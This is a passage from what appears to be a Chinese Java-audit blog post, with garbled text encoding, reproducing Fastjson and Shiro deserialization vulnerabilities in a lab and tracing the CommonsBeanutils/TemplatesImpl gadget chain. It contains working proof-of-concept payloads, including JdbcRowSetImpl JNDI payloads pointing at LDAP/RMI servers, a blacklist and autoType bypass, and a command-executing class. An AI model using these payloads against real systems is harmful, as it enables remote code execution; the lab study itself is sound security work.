‡æœºã€‚</li><li>å­˜åœ¨æ¼æ´çš„é¶æœºå¯¹jsonååºåˆ—åŒ–æ—¶å€™ï¼Œä¼šåŠ è½½æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„æ¶æ„ä¿¡æ¯(è®¿é—®rmiæœåŠ¡å™¨)ï¼Œé¶æœºæœåŠ¡å™¨å°±ä¼šå‘rmiæœåŠ¡å™¨è¯·æ±‚å¾…æ‰§è¡Œçš„å‘½ä»¤ã€‚ä¹Ÿå°±æ˜¯é¶æœºæœåŠ¡å™¨é—®rmiæœåŠ¡å™¨ï¼Œï¼ˆé¶æœºæœåŠ¡å™¨ï¼‰éœ€è¦æ‰§è¡Œä»€ä¹ˆå‘½ä»¤</li><li>rmi æœåŠ¡å™¨è¯·æ±‚åŠ è½½è¿œç¨‹æœºå™¨çš„classï¼ˆè¿™ä¸ªè¿œç¨‹æœºå™¨æ˜¯æˆ‘ä»¬æ­å»ºå¥½çš„æ¶æ„ç«™ç‚¹ï¼Œæå‰å°†æ¼æ´åˆ©ç”¨çš„ä»£ç ç¼–è¯‘å¾—åˆ°.classæ–‡ä»¶ï¼Œå¹¶ä¸Šä¼ è‡³æ¶æ„ç«™ç‚¹ï¼‰ï¼Œå¾—åˆ°æ”»å‡»è€…ï¼ˆæˆ‘ä»¬ï¼‰æ„é€ å¥½çš„å‘½ä»¤ï¼ˆping dnslogæˆ–è€…åˆ›å»ºæ–‡ä»¶æˆ–è€…åå¼¹shellå•¥çš„ï¼‰</li><li>rmiå°†è¿œç¨‹åŠ è½½å¾—åˆ°çš„classï¼ˆæ¶æ„ä»£ç ï¼‰ï¼Œä½œä¸ºå“åº”è¿”å›ç»™é¶æœºæœåŠ¡å™¨ã€‚<br>é¶æœºæœåŠ¡å™¨æ‰§è¡Œäº†æ¶æ„ä»£ç ï¼Œè¢«æ”»å‡»è€…æˆåŠŸåˆ©ç”¨ã€‚</li></ol></li></ul><h4 id="Jndiæ³¨å…¥åŸç†"><a href="#Jndiæ³¨å…¥åŸç†" class="headerlink" title="Jndiæ³¨å…¥åŸç†"></a>Jndiæ³¨å…¥åŸç†</h4><ul><li><p>JNDIå³Java Naming and Directory Interfaceï¼ˆJAVAå‘½åå’Œç›®å½•æ¥å£ï¼‰ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚</p></li><li><p>JNDI æ³¨å…¥ï¼Œå³å½“å¼€å‘è€…åœ¨å®šä¹‰ <code>JNDI</code> æ¥å£åˆå§‹åŒ–æ—¶ï¼Œ<code>lookup()</code> æ–¹æ³•çš„å‚æ•°å¯æ§ï¼Œæ”»å‡»è€…å°±å¯ä»¥å°†æ¶æ„çš„ <code>url</code> ä¼ å…¥å‚æ•°è¿œç¨‹åŠ è½½æ¶æ„è½½è·ï¼Œé€ æˆæ³¨å…¥æ”»å‡»ã€‚</p></li></ul><h4 id="æ¼æ´ç¯å¢ƒæ­å»º"><a href="#æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»º"></a>æ¼æ´ç¯å¢ƒæ­å»º</h4><h5 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h5><ul><li><p>FastjsonController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:31&#125;&quot;</span>;<br>        String userStr=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.kuang.fastjson.demos.web.User\&quot;,\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:21&#125;&quot;</span>;<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> JSON.parseObject(userStr);<br>        System.out.println(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>åŠ å…¥Userç±»è§£æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">private</span> Integer age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œåå‘ç°ä¼ å…¥å…¶ä»–ç±»è§£æåé»˜è®¤æ‰§è¡Œget  setç±»æ–¹æ³•</p></li><li><p>æ„é€ poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//è§¦å‘fastjsonååºåˆ—åŒ–ç”¨åˆ°JSON.parseObject,JSON.parse()</span><br><br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:31&#125;&quot;</span>;<br>        String userStr=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.kuang.fastjson.demos.web.User\&quot;,\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:21&#125;&quot;</span>;<br>        String poc=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://172.31.80.1:1389/fjfljn\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> JSON.parseObject(poc);<br>        System.out.println(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼ï¼ï¼</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A132.png"></p></li><li><p>ååºåˆ—åŒ–åŸç†åˆ†æ</p><ul><li><p>ä¼ å…¥å…¶ä»–ç±»è§£ææ—¶ä¼šè°ƒç”¨  getdataSourceNameï¼ŒsetdataSourceNameï¼Œ</p><pre><code class="hljs">                                         getautoCommitï¼ŒsetautoCommitæ–¹æ³•</code></pre></li><li><p>è°ƒç”¨setAutoCommitæ–¹æ³•æ—¶è°ƒç”¨äº† connectæ–¹æ³•ï¼Œconnectæ–¹æ³•ä¸­è°ƒç”¨äº†lookup()æ–¹æ³•</p><p>æ§åˆ¶æ³¨å…¥æ ¸å¿ƒè§¦å‘ä»£ç </p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A133.png"></p></li><li><p>åˆ†æè¿‡ç¨‹</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A134.png"></p></li></ul></li></ul><h5 id="1-2-25ç‰ˆæœ¬"><a href="#1-2-25ç‰ˆæœ¬" class="headerlink" title="1.2.25ç‰ˆæœ¬"></a>1.2.25ç‰ˆæœ¬</h5><ul><li><p>å‘ç°åŸæ¥çš„pocæ— æ³•æ‰§è¡Œ</p></li><li><p>å®šä½åˆ°<code>checkAutoType()</code>æ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹å®ƒçš„é€»è¾‘ï¼šå¦‚æœå¼€å¯äº†<code>autoType</code>ï¼Œé‚£ä¹ˆå°±å…ˆåˆ¤æ–­ç±»ååœ¨ä¸åœ¨ç™½åå•ä¸­ï¼Œå¦‚æœåœ¨å°±ç”¨<code>TypeUtils.loadClass</code>åŠ è½½ï¼Œå¦‚æœä¸åœ¨å°±å»åŒ¹é…é»‘åå•ï¼š</p><p>jndiæ³¨å…¥éœ€è¦çš„ç±»ååœ¨é»‘åå•ä¸­ï¼ŒautoTypeé»˜è®¤å…³é—­ï¼Œæ— æ³•ä½¿ç”¨åŸpoc</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm7ZibH49F3GjQpYAic5fibnLPIPibNDVZ3Zq8iaeA6uxPbqOxqcd536j9ztw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1"></p></li><li><p>åœ¨demo controllerä¸­æ·»åŠ ä¸€è¡Œä»£ç ï¼Œå¼€å¯AutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>åœ¨åŸpocåŒ…åå‰åŠ ä¸ŠLï¼Œåé¢åŠ ;</p><p>å³å¯å¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A135.png"></p></li><li><p>å‘æ˜ä¸¤æ­¥éª¤çš„åŸå› </p><ul><li><p>å‰åŠ Lï¼ŒååŠ ï¼›ï¼Œç”¨äºç»•è¿‡é»‘åå•ï¼Œåç»­æœ‰æ–¹æ³•å»é™¤Lä¸ï¼›</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A136.png"></p></li><li><p>å¼€å¯autoType</p><p>æ–­ç‚¹è°ƒè¯•åå‘ç°ï¼Œå¦‚æœä¸å¼€å¯autoTypeï¼Œä¸ä¼šåŒ¹é…ç™½åå•ï¼Œä¼šç›´æ¥çˆ†å‡ºautoType is not support</p><p>åç»­ä»£ç éƒ½å…¨éƒ¨æ˜¾ç¤ºå¼‚å¸¸</p></li></ul></li></ul><h5 id="1-2-25-1-2-47é€šæ€poc"><a href="#1-2-25-1-2-47é€šæ€poc" class="headerlink" title="1.2.25-1.2.47é€šæ€poc"></a>1.2.25-1.2.47é€šæ€poc</h5><ul><li><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;a&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="hljs-string">&quot;b&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1/exp&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;<br></code></pre></td></tr></table></figure></li><li><p>æµ‹è¯•å‘ç°èƒ½æ­£å¸¸å¼¹å‡ºè®¡ç®—å™¨</p></li><li><p>åˆ©ç”¨æ­¥éª¤</p><ul><li>åˆ©ç”¨java.lang.Classå°†æ¶æ„ç±»åŠ è½½åˆ°mappingsä¸­</li><li>ä»mappingsä¸­å–å‡ºæ¶æ„ä»£ç å¹¶ç»•è¿‡é»‘åå•è¿›è¡Œååºåˆ—åŒ–</li></ul></li></ul><h3 id="Shiroååºåˆ—åŒ–"><a href="#Shiroååºåˆ—åŒ–" class="headerlink" title="Shiroååºåˆ—åŒ–"></a>Shiroååºåˆ—åŒ–</h3><ul><li><p>shiroååºåˆ—åŒ–é“¾åˆ†æ(è·å–ç”¨æˆ·è¯·æ±‚)</p><ul><li>è·å–cookieä¸­rememberMeçš„å€¼</li><li>å¯¹rememberè¿›è¡ŒBase64è§£ç </li><li>ä½¿ç”¨AESè§£å¯†</li><li>å¯¹è§£å¯†çš„å€¼è¿›è¡Œååºåˆ—åŒ–</li></ul><p>550ï¼šShiro-550 æ¼æ´ä¸»è¦æ˜¯ç”±äº Shiro çš„ <em>rememberMe</em> å†…å®¹ååºåˆ—åŒ–å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚å…¶åŸå› æ˜¯é»˜è®¤åŠ å¯†å¯†é’¥ç¡¬ç¼–ç åœ¨ Shiro æºç ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œå¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ã€ç¼–ç ï¼Œç„¶åå°†å…¶ä½œä¸º cookie çš„ rememberMe å­—æ®µå†…å®¹å‘é€ï¼ŒShiro å°†å¯¹å…¶è§£ç å’Œååºåˆ—åŒ–ï¼Œå¯¼è‡´æœåŠ¡å™¨è¿è¡Œæ¶æ„ä»£ç ã€‚</p><p>721ï¼šShiro-721 æ¼æ´åˆ©ç”¨äº† AES-128-CBC åŠ å¯†æ¨¡å¼çš„ Padding Oracle Attackã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ Padding Oracle åŠ å¯†ç”Ÿæˆçš„æ”»å‡»ä»£ç æ¥æ„é€ æ¶æ„çš„ rememberMe å­—æ®µï¼Œå¹¶é‡æ–°è¯·æ±‚ç½‘ç«™ï¼Œè¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼Œæœ€ç»ˆå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</p></li></ul><h4 id="æ¼æ´ç¯å¢ƒæ­å»ºä»¥åŠåˆ©ç”¨é“¾åˆ†æ"><a href="#æ¼æ´ç¯å¢ƒæ­å»ºä»¥åŠåˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»ºä»¥åŠåˆ©ç”¨é“¾åˆ†æ"></a>æ¼æ´ç¯å¢ƒæ­å»ºä»¥åŠåˆ©ç”¨é“¾åˆ†æ</h4><h5 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h5><p><a href="https://www.cnblogs.com/nice0e3/p/14183173.html">Javaå®‰å…¨ä¹‹Shiro 550ååºåˆ—åŒ–æ¼æ´åˆ†æ - nice_0e3 - åšå®¢å›­ (cnblogs.com)</a></p><ul><li><p>ç»™jstlåŠ ä¸Šç‰ˆæœ¬ä¸º1.2</p></li><li><p>tomcatéƒ¨ç½²å·¥ä»¶</p></li><li><p>è®¿é—®url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1:8089/samples_web_war/login.jsp<br></code></pre></td></tr></table></figure></li><li><p>ç™»å½•æ—¶æŠ“å–æ•°æ®åŒ…</p></li><li><p>åœ¨è¿”å›åŒ…ä¸­æ‰¾åˆ°cookieå…³é”®å­—ä¸ºrememberMe</p></li><li><p>é€šè¿‡å…³é”®å­—çˆ†ç ´å¯†é’¥å¹¶æ£€æµ‹</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A137.png"></p></li><li><p>æ¼æ´åˆ†æ</p></li><li><p>åœ¨DefaultSecurityManagerç±»çš„rememberMeSuccessfulLoginæ–¹æ³•å¤„ä¸‹æ–­ç‚¹</p><p>ç›®çš„ï¼š</p><ul><li>shiroç™»é™†æ“ä½œæ‰§è¡Œé€»è¾‘</li><li>ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿ</li><li>åˆ©ç”¨æ¡ä»¶</li></ul></li><li><p>è¿½è¸ªå‡½æ•°åå‘ç°</p><ul><li><p>åŠ å¯†ï¼šåºåˆ—åŒ–-&gt;aesåŠ å¯†-&gt;base64åŠ å¯†-&gt;å­˜å…¥cookie</p></li><li><p>æ¥å—åºåˆ—åŒ–æ•°æ®è§£å¯†</p><p>æ¥å—è§£å¯†ï¼šbase64è§£ç -&gt;aesè§£å¯†-&gt;ååºåˆ—åŒ–</p></li></ul></li><li><p>è°ƒè¯•æ—¶å‘ç°çš„AESåŠ å¯†å¯†é’¥</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A138.png"></p><p>keyæ•°ç»„å¯åˆ©ç”¨pythonè„šæœ¬è¿˜åŸä¸ºåŸå¯†é’¥å­—ç¬¦ä¸²</p></li><li><p>shiroååºåˆ—åŒ–æ— æ³•åˆ©ç”¨fastjsonçš„åˆ©ç”¨é“¾</p><ul><li><p>åŸå› </p><ul><li><p>fastjsonåˆ©ç”¨æ–¹æ³•ï¼šè°ƒç”¨JdbcRowSetImplç±»ï¼Œé€šè¿‡setï¼Œgetæ–¹æ³•è§¦å‘lookupæ–¹æ³•ä¼ å‚(ååºåˆ—åŒ–è‡ªå®šä¹‰æ–¹æ³•)ï¼Œè¿œç¨‹è°ƒç”¨è„šæœ¬</p></li><li><p>shiroååºåˆ—åŒ–ï¼šåˆ©ç”¨åŸç”Ÿååºåˆ—åŒ–å‡½æ•°ï¼šreadObject  writeObject  ObjectInputStream(æ¼æ´ç‚¹)</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A139.png"></p></li><li><p>shiroå¯èƒ½æœ‰JdbcRowSetImplç±»ï¼Œä¸æ»¡è¶³è§¦å‘setï¼Œgetæ¡ä»¶</p></li></ul></li></ul></li><li><p>åˆ©ç”¨å·¥å…·ä½¿ç”¨åˆ©ç”¨é“¾æ‰§è¡Œå‘½ä»¤ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A140.png"></p></li></ul><h4 id="ccåˆ©ç”¨é“¾åˆ†æ"><a href="#ccåˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="ccåˆ©ç”¨é“¾åˆ†æ"></a>ccåˆ©ç”¨é“¾åˆ†æ</h4><ul><li><p>CCé“¾ï¼Œå…¨ç§°ä¸ºCommonsCollectionsé“¾ï¼Œæ˜¯æŒ‡åœ¨Javaååºåˆ—åŒ–æ¼æ´ä¸­åˆ©ç”¨Apache Commons Collectionsåº“ä¸­çš„ç‰¹å®šç±»å’Œæ–¹æ³•ï¼Œæ„é€ å‡ºä¸€æ¡å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç çš„è°ƒç”¨é“¾ã€‚CCé“¾çš„æ ¸å¿ƒåœ¨äºåˆ©ç”¨åå°„æœºåˆ¶ï¼Œé€šè¿‡ä¸€ç³»åˆ—çš„ç±»å’Œæ–¹æ³•è°ƒç”¨ï¼Œæœ€ç»ˆè¾¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç çš„ç›®çš„ã€‚</p></li><li><p>æ”»å‡»é“¾çš„é€‰å–ä¸æ¡†æ¶åŠ è½½çš„å¤–éƒ¨åº“æœ‰å…³ï¼Œå¤–éƒ¨åº“ä¸­å­˜åœ¨åŸç”Ÿçš„æ¼æ´</p></li><li><p>CBé“¾åˆ†æï¼š<a href="https://www.freebuf.com/articles/web/319397.html">å…³äºæˆ‘å­¦æ¸—é€çš„é‚£æ¡£å­äº‹ä¹‹Javaååºåˆ—åŒ–-CBé“¾ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p></li><li><p>çŸ¥è¯†è¦ç‚¹</p><ul><li><p>å…¥å£ç‚¹ï¼šè§¦å‘ååºåˆ—åŒ–çš„é‡å†™readObjectæ–¹æ³•</p></li><li><p>getProperty()æ–¹æ³•</p><p>CBé‡Œé¢çš„ç±»æ–¹æ³•  å¯¹å¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•è¿›è¡Œè°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//PropertyUtils.getProperty(new Person(),&quot;name&quot;);</span><br><span class="hljs-comment">//è‡ªåŠ¨è°ƒç”¨Personå¯¹è±¡é‡Œé¢çš„getNameæ–¹æ³•</span><br>PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>(),<span class="hljs-string">&quot;outputProperties&quot;</span>)<br><span class="hljs-comment">//è‡ªåŠ¨è°ƒç”¨TemplatesImplå¯¹è±¡é‡Œé¢çš„getOutputPropertiesæ–¹æ³•</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>æ¼æ´å¤ç°åŠCBé“¾åˆ†æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å°†åˆ©ç”¨é“¾åˆ†ä¸ºä¸‰éƒ¨åˆ†</span><br><br>TemplatesImptç±»-&gt;è°ƒç”¨æ¶æ„ç±»<br><br>BeanComparatorç±»-&gt;åˆ©ç”¨javabeanè°ƒç”¨getOutputProperties()<br><br>PriorityQueueç±»-&gt;åå°„è°ƒç”¨PropertyUtils.getPropert<br></code></pre></td></tr></table></figure><ul><li><p>å…¥å£ç‚¹</p><p>PriorityQueue #readObject -&gt; heapify() -&gt; siftDown -&gt; siftDownUsingComparator -&gt; comparator.compare</p><p>-&gt; BeanComparator.compare</p><p>BeanComparator.compareä¼šæ‰§è¡ŒPropertyUtils.getProperty</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o1, <span class="hljs-built_in">this</span>.property);<br><span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o2, <span class="hljs-built_in">this</span>.property);<br><br>o1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>()<br>property=outputProperties<br>ä¼šè‡ªåŠ¨è°ƒç”¨TemplatesImpl#getOutputPropertiesæ–¹æ³•<br></code></pre></td></tr></table></figure><p>æ¡ä»¶</p><ul><li>size &gt;&#x3D;2</li><li>comparator !&#x3D; null</li><li>property  !&#x3D;  null</li></ul><p>TemplatesImpl é“¾ï¼Œå±äºCCé“¾åˆ†æ  RCE</p><p>-&gt;  TemplatesImpl #getOutputProperties</p><p>-&gt;  newTransformer()</p><p>-&gt;  TransformerImpl(getTransletInstance())</p><p>-&gt;  defineTransletClasses()</p><p>-&gt;  loader.defineClass(æ‰§è¡Œå‘½ä»¤)</p><p>æ¡ä»¶ï¼š</p><p>_name !&#x3D;null</p><p>_class   !&#x3D;null</p><p>_bytecodes !&#x3D; null (å‘½ä»¤å‚æ•°)</p></li></ul></li><li><p>loader.defineClass</p><p><code>ClassLoader.defineClass</code> æ˜¯ <code>ClassLoader</code> çš„ä¸€ä¸ªå—ä¿æŠ¤æ–¹æ³•ï¼Œå®ƒå…è®¸å°†å­—èŠ‚æ•°ç»„è½¬æ¢ä¸º Java ç±»ã€‚æ”»å‡»è€…å¯å€ŸåŠ©å®ƒåŠ è½½ä»»æ„æ¶æ„ç±»ï¼ˆå³â€œå†…å­˜é©¬â€æˆ–åŒ…å«å‘½ä»¤æ‰§è¡Œçš„ç±»ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = loader.defineClass(name, classBytes, <span class="hljs-number">0</span>, classBytes.length);<br></code></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œ<code>classBytes</code> ä¸­çš„å­—èŠ‚ç å°±ä¼šè¢«å®šä¹‰ä¸ºç±»å¹¶åŠ è½½è¿› JVMï¼Œéšä¹‹å¯èƒ½æ‰§è¡Œé™æ€ä»£ç å—æˆ–æ„é€ æ–¹æ³•ä¸­æºå¸¦çš„æ¶æ„é€»è¾‘ã€‚</p><p><code>defineClass</code> æœ¬èº«ä¸æ‰§è¡Œå‘½ä»¤ï¼Œå®ƒåªæ˜¯<strong>å°†å­—èŠ‚ç åŠ è½½ä¸ºç±»</strong>ã€‚çœŸæ­£æ‰§è¡Œå‘½ä»¤çš„è¡Œä¸ºï¼Œé€šå¸¸å‘ç”Ÿåœ¨ï¼š</p><ul><li>ç±»çš„<strong>é™æ€ä»£ç å—</strong>ï¼›</li><li>ç±»çš„<strong>æ„é€ æ–¹æ³•</strong>ï¼›</li><li>ç±»çš„æ–¹æ³•ä¸­ï¼Œè¢«éšåç«‹å³è°ƒç”¨ã€‚</li></ul><p>ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€æ—¦è¢«åŠ è½½ï¼ˆé€šè¿‡ <code>defineClass</code>ï¼‰ï¼Œè¿™ä¸ªç±»çš„é™æ€ä»£ç å—å°±ä¼šç«‹å³æ‰§è¡Œï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œã€‚</p></li><li><p>ååºåˆ—åŒ–ç®€åŒ–æµç¨‹å›¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">ååºåˆ—åŒ–å…¥å£<br>     â†“<br>CCåˆ©ç”¨é“¾è§¦å‘ï¼ˆTemplatesImplã€InvokerTransformer 